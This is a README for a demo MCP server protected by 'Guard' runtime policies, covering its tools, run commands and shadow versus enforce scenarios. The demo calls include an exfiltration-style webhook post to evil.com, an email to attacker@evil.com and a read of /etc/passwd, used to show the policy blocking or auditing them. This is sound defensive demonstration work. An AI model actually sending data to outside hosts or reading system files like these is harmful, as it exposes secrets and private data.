# Agent Runtime Security MCP Example Server

[English](./README.md) | [한국어](./README.ko.md)

This is a demo MCP server protected by Guard policies. It uses four tools to show the core behavior of the SDK.

This example is the default TrapDefense demo path for customer conversations about MCP protection and runtime policy rollout.

The policy file already uses YAML `version: 2`, so global defaults and `tools:` overrides are both part of the demo.

## Tools

| Tool | Demo point |
|------|------------|
| `post_webhook` | Block external HTTP egress |
| `send_email` | Inspect recipient domains with a tool-specific allowlist |
| `read_file` | Restrict file paths |
| `search` | Automatically redact PII in results |

## Run

```bash
# Run with MCP Inspector
mcp dev examples/mcp_server.py

# Or run directly
python examples/mcp_server.py

# Rehearsal script for the customer demo
python examples/demo.py
```

## Demo Scenarios

### 1. Shadow mode (default)

Run the server with `mode: shadow` in `policy.yaml`.

```text
send_email(to="attacker@evil.com", subject="test", body="hello")
-> Allowed to execute, audit records original_action=warn

read_file(path="/etc/passwd")
-> Allowed to execute, but audit records original_action=block

search(query="admin")
-> PII is redacted from the result (data protection still applies in shadow mode)
```

### 2. Enforce mode

Change `policy.yaml` to `mode: enforce` and restart.

```text
post_webhook(url="https://evil.com/hooks", body="hello")
-> Blocked: "Tool 'post_webhook' blocked by policy 'domain_allowlist'"

post_webhook(url="https://internal.com/hooks", body="hello")
-> Allowed (domain is on the allowlist)

send_email(to="attacker@evil.com", subject="test", body="hello")
-> Allowed with warning/audit evidence for an external recipient domain

send_email(to="user@mail.internal", subject="test", body="hello")
-> Allowed (domain is on the send_email tool allowlist)

read_file(path="/etc/passwd")
-> Blocked: "Tool 'read_file' blocked by policy 'file_path_allowlist'"

read_file(path="/tmp/safe/data.txt")
-> Allowed (path is on the allowlist)

search(query="admin")
-> PII is redacted from the result
```

## Policy File

Update `policy.yaml` to change policy behavior without modifying code.

Key points in this example policy:

- Global defaults apply to every tool.
- `tools.send_email` overrides the global domain allowlist and mode.
- `tools.read_file` overrides the allowed file paths for that tool only.
- Unregistered tools such as `search` fall back to the global policy.

## LangChain / LangGraph Examples

Guard also integrates with LangChain and LangGraph:

```bash
# LangChain: protect individual tools with guard_tool()
python examples/langchain_agent.py

# LangGraph: protect all tools in a ToolNode
python examples/langgraph_agent.py
```

Both examples run without an LLM and demonstrate allow, block, and PII redaction scenarios.

## Suggested Demo Order

1. Run `python examples/demo.py` to confirm shadow/enforce behavior before the meeting.
2. Start `mcp dev examples/mcp_server.py` for the live demo.
3. Show shadow mode first, then switch `policy.yaml` to `mode: enforce`.
4. Use `post_webhook`, `read_file`, and `search` in that order for the main demo, then `send_email` as an optional recipient-domain example.

## Decorator Note

- `examples/demo.py` uses `@guard.tool()` directly because it is a plain Python rehearsal script.
- `examples/mcp_server.py` keeps `mcp_guard()` during the v0.3.x transition because it preserves MCP-native `ToolError` behavior while delegating to `guard.tool()` internally.
